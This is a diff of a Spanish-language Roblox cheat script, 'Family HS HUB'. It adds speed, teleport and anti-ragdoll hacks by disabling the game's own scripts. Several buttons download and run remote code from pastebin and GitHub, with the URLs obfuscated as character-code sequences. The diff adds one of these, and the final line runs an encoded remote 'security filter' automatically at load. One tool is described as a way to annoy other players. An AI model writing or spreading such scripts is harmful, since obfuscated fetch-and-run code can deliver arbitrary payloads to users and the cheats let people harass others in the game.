@@ -1,8 +1,6 @@
 local _v1,_v2,_v3,_v4,_v5,_v6,_v7=game:GetService("Players"),game:GetService("UserInputService"),game:GetService("RunService"),game:GetService("CoreGui"),game:GetService("ReplicatedStorage"),game:GetService("TeleportService"),game:GetService("HttpService")
 local _v8 = _v1.LocalPlayer
 local _v9 = loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,70,111,111,116,97,103,101,115,117,115,47,87,105,110,100,85,73,47,109,97,105,110,47,100,105,115,116,47,109,97,105,110,46,108,117,97)))()
-
--- =====================================================================
 -- MOTOR DE SEGURIDAD Y ENRUTAMIENTO DE INTERFAZ
 -- =====================================================================
 local function GetSecureContainer()
@@ -34,7 +32,7 @@ local function disableBadScripts(char)
             if name:find("stun") or name:find("fall") or name:find("ragdoll") then
                 if not obj.Disabled then
                     obj.Disabled = true
-                    table.insert(_disabledScripts, obj) 
+                    table.insert(_disabledScripts, obj)
                 end
             end
         end
@@ -44,24 +42,24 @@ end
 local function enableBadScripts()
     for _, obj in ipairs(_disabledScripts) do
         if obj and obj.Parent then
-            pcall(function() obj.Disabled = false end) 
+            pcall(function() obj.Disabled = false end)
         end
     end
-    table.clear(_disabledScripts) 
+    table.clear(_disabledScripts)
 end
 
-local function _f1(st) 
-    _s1.AR = st; 
+local function _f1(st)
+    _s1.AR = st
     local ev = _v5:FindFirstChild("Events")
     if ev then ev = ev:FindFirstChild("RagdollState") end
-    
-    if st then 
+
+    if st then
         if _c3 then _c3:Disconnect(); _c3 = nil end
 
-        _c3 = _v3.Heartbeat:Connect(function() 
-            if not _s1.AR then return end; 
-            if ev then pcall(function() ev:FireServer(false) end) end; 
-            
+        _c3 = _v3.Heartbeat:Connect(function()
+            if not _s1.AR then return end
+            if ev then pcall(function() ev:FireServer(false) end) end
+
             local badStates = {
                 [Enum.HumanoidStateType.Physics] = true,
                 [Enum.HumanoidStateType.FallingDown] = true,
@@ -69,44 +67,44 @@ local function _f1(st)
                 [Enum.HumanoidStateType.Ragdoll] = true
             }
 
-            if _v8.Character then 
-                local h = _v8.Character:FindFirstChildOfClass("Humanoid"); 
-                if h then 
-                    h:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false) 
-                    h:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false) 
-                    
-                    if badStates[h:GetState()] then 
-                        h:ChangeState(Enum.HumanoidStateType.Running) 
-                    end; 
-                    h.PlatformStand = false;
-                end 
-            end 
-        end); 
-        
+            if _v8.Character then
+                local h = _v8.Character:FindFirstChildOfClass("Humanoid")
+                if h then
+                    h:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
+                    h:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+
+                    if badStates[h:GetState()] then
+                        h:ChangeState(Enum.HumanoidStateType.Running)
+                    end
+                    h.PlatformStand = false
+                end
+            end
+        end)
+
         disableBadScripts(_v8.Character)
-        
+
         if _charAddedConn then _charAddedConn:Disconnect() end
         _charAddedConn = _v8.CharacterAdded:Connect(function(char)
             if _s1.AR then
-                task.wait(1.5) 
+                task.wait(1.5)
                 disableBadScripts(char)
             end
         end)
-        
-    else 
-        if _c3 then _c3:Disconnect(); _c3 = nil; end; 
-        if _charAddedConn then _charAddedConn:Disconnect(); _charAddedConn = nil; end
-        
-        if _v8.Character then 
-            local h = _v8.Character:FindFirstChildOfClass("Humanoid"); 
-            if h then 
-                h:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true) 
+
+    else
+        if _c3 then _c3:Disconnect(); _c3 = nil end
+        if _charAddedConn then _charAddedConn:Disconnect(); _charAddedConn = nil end
+
+        if _v8.Character then
+            local h = _v8.Character:FindFirstChildOfClass("Humanoid")
+            if h then
+                h:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
                 h:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
-            end 
-        end 
-        
+            end
+        end
+
         enableBadScripts()
-    end 
+    end
 end
 
 _c1=_v2.JumpRequest:Connect(function() if _s1.IJ and _v8.Character and _v8.Character:FindFirstChildOfClass("Humanoid") then _v8.Character.Humanoid:ChangeState(3) end end)
@@ -126,8 +124,6 @@ local function _f6(b) local dr,ei,pi,pb=false,nil,nil,nil; b.InputBegan:Connect(
 local _btn1
 _btn1=_f4("DASH\nOFF",UDim2.fromScale(0.72,0.04),Color3.fromRGB(100,100,100),function() _s1.TP.E=not _s1.TP.E; _btn1.Text=_s1.TP.E and "DASH\nON" or "DASH\nOFF"; _btn1.BackgroundColor3=_s1.TP.E and Color3.fromRGB(37,122,247) or Color3.fromRGB(100,100,100) end)
 _f6(_btn1)
-
--- =====================================================================
 -- CREACIÓN DE VENTANA (WINDUI)
 -- =====================================================================
 local _w1=_v9:CreateWindow({
@@ -155,7 +151,7 @@ local _w1=_v9:CreateWindow({
 _w1:SetToggleKey(Enum.KeyCode[_s1.UI.K])
 
 task.spawn(function()
-    task.wait(2) 
+    task.wait(2)
     local uiContainer = GetSecureContainer()
     local targetStroke = nil
 
@@ -164,8 +160,8 @@ task.spawn(function()
             local currentLayer = obj
             for i = 1, 4 do
                 if currentLayer then
-                    if not targetStroke then 
-                        targetStroke = currentLayer:FindFirstChildOfClass("UIStroke") 
+                    if not targetStroke then
+                        targetStroke = currentLayer:FindFirstChildOfClass("UIStroke")
                     end
                     currentLayer = currentLayer.Parent
                 end
@@ -177,7 +173,7 @@ task.spawn(function()
     if targetStroke then
         local colorYellow = Color3.fromRGB(255, 255, 0)
         local colorBlack = Color3.fromRGB(0, 0, 0)
-        
+
         game:GetService("RunService").RenderStepped:Connect(function()
             local alpha = (math.sin(tick() * 3) + 1) / 2
             targetStroke.Color = colorYellow:Lerp(colorBlack, alpha)
@@ -186,8 +182,6 @@ task.spawn(function()
         warn("[HsHub] Error: No se pudo encontrar el contorno del OpenButton en el contenedor seguro.")
     end
 end)
-
--- =====================================================================
 -- PESTAÑAS Y FUNCIONES COMPLETAS
 -- =====================================================================
 local _tb1=_w1:Tab({Title="Movilidad",Icon="solar:running-bold"})
@@ -197,21 +191,20 @@ _tb1:Input({
     Title="Walk Speed",
     Desc="Modifica tu velocidad de movimiento",
     PlaceholderText="Ej: 16",
-    Callback=function(t) 
-        local v=tonumber(t); 
-        if v then 
-            _s1.WS.V=v 
-        else 
-            _s1.WS.V=16 
-            if _initWS then 
+    Callback=function(t)
+        local v=tonumber(t)
+        if v then
+            _s1.WS.V=v
+        else
+            _s1.WS.V=16
+            if _initWS then
                 _v9:Notify({Title="Ajuste automático", Content="Velocidad restaurada a 16 por defecto.", Duration=4})
             end
-        end 
-        _initWS = true 
+        end
+        _initWS = true
     end
 })
 
--- Implementada la lógica que restaura la velocidad base al apagar el toggle
 _tb1:Toggle({Title="Loop Speed",Desc="Mantiene la velocidad constante",Value=_s1.WS.E,Callback=function(s) _s1.WS.E=s; if not s and _v8 and _v8.Character then local h=_v8.Character:FindFirstChildOfClass("Humanoid") if h then h.WalkSpeed=16 end end end})
 
 local _initTP = false
@@ -219,17 +212,17 @@ _tb1:Input({
     Title="TP Walk",
     Desc="Distancia de teletransporte por paso",
     PlaceholderText="Ej: 1",
-    Callback=function(t) 
-        local v=tonumber(t); 
-        if v then 
-            _s1.TP.V=v 
-        else 
+    Callback=function(t)
+        local v=tonumber(t)
+        if v then
+            _s1.TP.V=v
+        else
             _s1.TP.V=1
-            if _initTP then 
+            if _initTP then
                 _v9:Notify({Title="Ajuste automático", Content="TP Walk restaurado a 1 por defecto.", Duration=4})
             end
-        end 
-        _initTP = true 
+        end
+        _initTP = true
     end
 })
 
@@ -247,7 +240,7 @@ task.spawn(function() while _b1 do task.wait(66) if _b1 and _dp1 then pcall(func
 _tb2:Button({Title="Teleport to Selected",Desc="Viaja seguro en mapas gigantes",Color=Color3.fromRGB(37,122,247),Justify="Center",Callback=function() local tg=_v1:FindFirstChild(_dp1.Value or ""); if tg and tg.Character and tg.Character:FindFirstChild("HumanoidRootPart") and _v8.Character and _v8.Character:FindFirstChild("HumanoidRootPart") then local hrp=_v8.Character.HumanoidRootPart; hrp.Anchored=true; _v8.Character:PivotTo(tg.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,3)); task.delay(0.6,function() if hrp then hrp.Anchored=false end end) end end})
 local _b2=false
 _tb2:Button({Title="⌛Refresh Player List",Desc="Actualizar manualmente de forma forzada",Justify="Center",Callback=function() _dp1:Refresh(_f5()); if not _b2 then _b2=true; _v9:Notify({Title="¡Lista Actualizada!",Content="Se han recargado los jugadores.",Duration=5}); task.delay(5,function() _b2=false end) end end})
-_tb2:Button({Title="🌀 abrir portalius",Desc="con esto puedes ir a dónde quieras literalmente el poder de portales🌀",Color=Color3.fromRGB(255,215,0),Justify="Center",Callback=function() loadstring(game:HttpGet("x"))() end})
+_tb2:Button({Title="🌀 abrir portalius",Desc="con esto puedes ir a dónde quieras literalmente el poder de portales🌀",Color=Color3.fromRGB(255,215,0),Justify="Center",Callback=function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\106\97\107\101\116\104\101\100\97\114\107\115\47\80\111\114\116\97\108\105\117\115\45\103\117\110\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\80\111\114\116\97\108\105\117\115\37\50\48\103\117\110"))() end})
 _tb2:Button({Title="⚙️ abrir auto farm",Desc="sirve para farmear o también una alternativa de bang para molestar 😹☝️",Color=Color3.fromRGB(0,128,255),Justify="Center",Callback=function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\101\81\107\89\75\78\85\106"))() end})
 _tb2:Button({Title="🔙Rejoin Server",Desc="Te saca y te vuelve a meter al mismo servidor",Color=Color3.fromRGB(192,39,52),Justify="Center",Callback=function() _v6:TeleportToPlaceInstance(game.PlaceId,game.JobId,_v8) end})
 
@@ -263,16 +256,14 @@ _tb3:Button({Title="⌛A-R-T scrimer HS",Desc="un arma para darle un levanton al
 _tb3:Button({Title="💥gema de la realidad",Desc="altera la realidad te cambia el modo de juego",Color=Color3.fromRGB(255,0,0),Callback=function() local _g,_l=game,loadstring;local _u=string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,105,75,84,90,82,120,68,112);_l(_g:HttpGet(_u))() end})
 _tb3:Button({Title="🛩️HS Flayers",Desc="pa ke vuelen alto mis panas esto funciona en otros juegos también",Color=Color3.fromRGB(37,122,247),Callback=function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\85\65\88\103\65\112\89\89"))() end})
 _tb3:Button({Title="👻invisibles y otras variantes 👻💥",Desc="es una mini biblioteca que contiene variantes de invisible",Color=Color3.fromRGB(255,255,0),Callback=function() local _g,_l=game,loadstring;local _u=string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,104,109,101,97,84,68,53,67);_l(_g:HttpGet(_u))() end})
-
--- =====================================================================
 -- DETECTOR DE DESTRUCCIÓN SEGURO (LIMPIEZA TOTAL AL USAR LA 'X')
 -- =====================================================================
 task.spawn(function()
-    task.wait(2) 
-    
+    task.wait(2)
+
     local uiContainer = GetSecureContainer()
     local mainGui = nil
-    
+
     for _, obj in ipairs(uiContainer:GetDescendants()) do
         if obj:IsA("TextLabel") and obj.Text == "☢️ Family HS HUB" then
             mainGui = obj:FindFirstAncestorWhichIsA("ScreenGui")
@@ -282,19 +273,18 @@ task.spawn(function()
 
     if mainGui then
         mainGui.Destroying:Connect(function()
-            if _b1 then 
-                _b1 = false 
-                _f1(false) 
-                
-                -- Limpieza de velocidad
+            if _b1 then
+                _b1 = false
+                _f1(false)
+
                 _s1.WS.E = false
                 if _v8.Character then
                     local h = _v8.Character:FindFirstChildOfClass("Humanoid")
                     if h then h.WalkSpeed = 16 end
                 end
-                
-                for _, c in pairs({_c1, _c2, _c4, _c5, _c6, _c7}) do 
-                    if c then c:Disconnect() end 
+
+                for _, c in pairs({_c1, _c2, _c4, _c5, _c6, _c7}) do
+                    if c then c:Disconnect() end
                 end
                 if _g1 then _g1:Destroy() end
                 if _w1 and _w1.Destroy then _w1:Destroy() end
@@ -304,6 +294,4 @@ task.spawn(function()
         warn("[HsHub] Búsqueda Segura Activa: No se pudo anclar la limpieza automática.")
     end
 end)
-
--- Ejecución del filtro de seguridad final
 loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,106,97,107,101,116,104,101,100,97,114,107,115,47,70,105,108,116,114,111,45,115,101,103,117,114,105,100,97,100,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,83,101,103,117,114,105,100,97,100,37,50,48,102,105,108,116,114,111)))()
